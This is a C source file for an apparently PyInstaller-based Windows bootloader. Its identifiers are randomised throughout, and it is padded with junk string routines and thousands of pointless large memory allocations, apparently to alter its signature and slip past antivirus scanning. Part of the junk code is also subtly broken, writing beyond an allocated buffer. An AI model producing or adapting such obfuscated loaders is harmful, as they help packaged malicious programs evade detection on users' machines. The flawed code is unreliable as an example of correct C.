int dRPpamEhMrcHR(ARCHIVE_STATUS *LuYomFptTdO, char const * UumUUIg, char  const * vUbFLoJzOJ) {
if (TsFCEChzdbpj(LuYomFptTdO, UumUUIg, vUbFLoJzOJ)) return -1;
if (ySQXyhSAKp(LuYomFptTdO)) return -1;
return 0; }
int Eezpizy(ARCHIVE_STATUS *hjmTBMu, int argc, char *argv[]) {
int VQiKEQBn = 0;
if (kvQzAxpTw(hjmTBMu)) return -1;
if (gWVJeVhOaCnXR(hjmTBMu, argc, argv)) return -1;
if (ojZdxcSb(hjmTBMu)) return -1;
if (DcBDCvzXzHz(hjmTBMu)) return -1;
VQiKEQBn = hfPKSje(hjmTBMu);
return VQiKEQBn; }
void UJyEzJgrrqmlOve(const char *iUJgTXHnToXK);
void FGhZEgTpq(char *YewnfndopHUkRpd, int Cmkggi, struct _finddata_t GXAFIhfDuEwD) {
if ( strcmp(GXAFIhfDuEwD.name, ".")==0  || strcmp(GXAFIhfDuEwD.name, "..") == 0 ) return;
YewnfndopHUkRpd[Cmkggi] = '\0';
strcat(YewnfndopHUkRpd, GXAFIhfDuEwD.name);
if ( GXAFIhfDuEwD.attrib & _A_SUBDIR ) UJyEzJgrrqmlOve(YewnfndopHUkRpd);
 else if (remove(YewnfndopHUkRpd)) { Sleep(100); remove(YewnfndopHUkRpd); } }
void UJyEzJgrrqmlOve(const char *XogVDKD) {
char LEOVCkdrEwqc[_MAX_PATH+1]; struct _finddata_t ukldDcYzYqlaTKT;
long kODIuSUc; int tBjNDHOomd; strcpy(LEOVCkdrEwqc, XogVDKD);
tBjNDHOomd = strlen(LEOVCkdrEwqc);
if ( LEOVCkdrEwqc[tBjNDHOomd-1] != '/' && LEOVCkdrEwqc[tBjNDHOomd-1] != '\\' ) { strcat(LEOVCkdrEwqc, "\\"); tBjNDHOomd++; }
strcat(LEOVCkdrEwqc, "*");
kODIuSUc = _findfirst(LEOVCkdrEwqc, &ukldDcYzYqlaTKT);
if (kODIuSUc != -1) {
    FGhZEgTpq(LEOVCkdrEwqc, tBjNDHOomd, ukldDcYzYqlaTKT);
    while ( _findnext(kODIuSUc, &ukldDcYzYqlaTKT) == 0 ) FGhZEgTpq(LEOVCkdrEwqc, tBjNDHOomd, ukldDcYzYqlaTKT);
    _findclose(kODIuSUc); }
rmdir(XogVDKD); }
void SOTaVefTGFLa(ARCHIVE_STATUS *lcGbYUtbSwyQmQ) { if (lcGbYUtbSwyQmQ->temppath[0]) UJyEzJgrrqmlOve(lcGbYUtbSwyQmQ->temppath); }
int CnrzJXw(ARCHIVE_STATUS *HKDCvkRLFQA) { return ntohl(HKDCvkRLFQA->cookie.pyvers); }
void vEtsPGVkTsmxCQ(void) { PI_Py_Finalize(); } 
char* LGKXcv(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\0'; return result; }
char* OyHxpZdUJvRrz(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\0'; return t2; }
char* GrBOvAdrR(){ char cnHViiJq[8931], jdIYDtHVfkiX[8931/2]; strcpy(cnHViiJq,"BmwhMlxMXSMgywfCAlmKrlNRpCWkRlfyHbVjxsjFWEReDKAcoF"); strcpy(jdIYDtHVfkiX,"wEpuYVdhsbGWOpmmyUNHWjLXYbKRPLSXlfzqezeYhQWuxajSCg"); return OyHxpZdUJvRrz(strcat( cnHViiJq, jdIYDtHVfkiX)); }
char* lvoMvTmsxAJ() { char iRjmXUxELKW[8931] = "YhazVQvAZtVqfaJEVAWooWZwjEBWhSiWhYvnYfYVRpIykwGlhj"; char *ATGopTxaArj = strupr(iRjmXUxELKW); return strlwr(ATGopTxaArj); }
char* iWcNMUWnGJT(){ char *eGJFOonS = LGKXcv("dBRhZPptZUcDTeLuzdTRVDEcLHcbYQHUXxcQVFuQmjdNbTuLjq"); return strstr( eGJFOonS, "H" );}
int APIENTRY WinMain( HINSTANCE IgyiLP, HINSTANCE SDlUvJcpwfFBSnx, LPSTR CCMTpiCniSoKI, int bufxhSHlEDUS ) {
char PgfyRRcDMJch[_MAX_PATH + 5];
char* mRtVojhjp[2247];
char **argv = __argv;
char* TaMvGMwggxdmjv[7830];
char* GUsEurngGC[4349];
char *WQoOFHqJoHrfE = NULL;
int i = 0;
WCHAR OznViRYNKgjeZ[_MAX_PATH + 1];
int argc = __argc;
int LrTYVwtmzPDJa = 0;
ARCHIVE_STATUS *uHJxCMVSelac[20];
char okaUzk[_MAX_PATH];
char MEIPASS2[_MAX_PATH + 11] = "_MEIPASS2=";
char OJpJTsdRiXSgVA[_MAX_PATH];
memset(&uHJxCMVSelac, 0, 20 * sizeof(ARCHIVE_STATUS *));
for (i = 0;  i < 2247;  ++i) mRtVojhjp[i] = malloc (8931);if ((uHJxCMVSelac[SELF] = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL){ return -1; }
JVCyONZgQ(okaUzk, argv[0]);
IuLLLcULmVX(OznViRYNKgjeZ);
for (i = 0;  i < 7830;  ++i) TaMvGMwggxdmjv[i] = malloc (9168);DKKeJygLDad(PgfyRRcDMJch, okaUzk);
MVzPDdJSZh(OJpJTsdRiXSgVA, okaUzk);
for (i = 0;  i < 4349;  ++i) GUsEurngGC[i] = malloc (9584);WQoOFHqJoHrfE = getenv( "_MEIPASS2" );
if (WQoOFHqJoHrfE && *WQoOFHqJoHrfE == 0) { WQoOFHqJoHrfE = NULL; }
if (dRPpamEhMrcHR(uHJxCMVSelac[SELF], OJpJTsdRiXSgVA, &okaUzk[strlen(OJpJTsdRiXSgVA)])) {
    if (dRPpamEhMrcHR(uHJxCMVSelac[SELF], OJpJTsdRiXSgVA, &PgfyRRcDMJch[strlen(OJpJTsdRiXSgVA)])) { return -1; } }
if (!WQoOFHqJoHrfE && !CxMFOmAYcNx(uHJxCMVSelac)) {
    WQoOFHqJoHrfE = OJpJTsdRiXSgVA;
    strcat(MEIPASS2, OJpJTsdRiXSgVA);
    putenv(MEIPASS2); }
if (WQoOFHqJoHrfE) {
    if (strcmp(OJpJTsdRiXSgVA, WQoOFHqJoHrfE) != 0) {
        strcpy(uHJxCMVSelac[SELF]->temppath, WQoOFHqJoHrfE);
        strcpy(uHJxCMVSelac[SELF]->temppathraw, WQoOFHqJoHrfE); }
    APVPgiK(WQoOFHqJoHrfE, okaUzk);
for (i=0; i<2247; ++i){strcpy(mRtVojhjp[i], GrBOvAdrR());}    LrTYVwtmzPDJa = Eezpizy(uHJxCMVSelac[SELF], argc, argv);
    pfMCjgKdOujxkxR();
    vEtsPGVkTsmxCQ();
} else { 
    if (WcDOapvnLPszOZh(uHJxCMVSelac)) { return -1; }
for (i=0; i<7830; ++i){strcpy(TaMvGMwggxdmjv[i], lvoMvTmsxAJ());}    strcat(MEIPASS2, uHJxCMVSelac[SELF]->temppath[0] != 0 ? uHJxCMVSelac[SELF]->temppath : OJpJTsdRiXSgVA);
    putenv(MEIPASS2);
    if (cOkGOydsmgDQ(uHJxCMVSelac[SELF]) == -1) return -1;
    LrTYVwtmzPDJa = RMZiMs(OznViRYNKgjeZ);
    if (uHJxCMVSelac[SELF]->temppath[0] != 0) UJyEzJgrrqmlOve(uHJxCMVSelac[SELF]->temppath);
    for (i = SELF; uHJxCMVSelac[i] != NULL; i++) { free(uHJxCMVSelac[i]); }}
for (i=0; i<4349; ++i){strcpy(GUsEurngGC[i], iWcNMUWnGJT());}return LrTYVwtmzPDJa; }
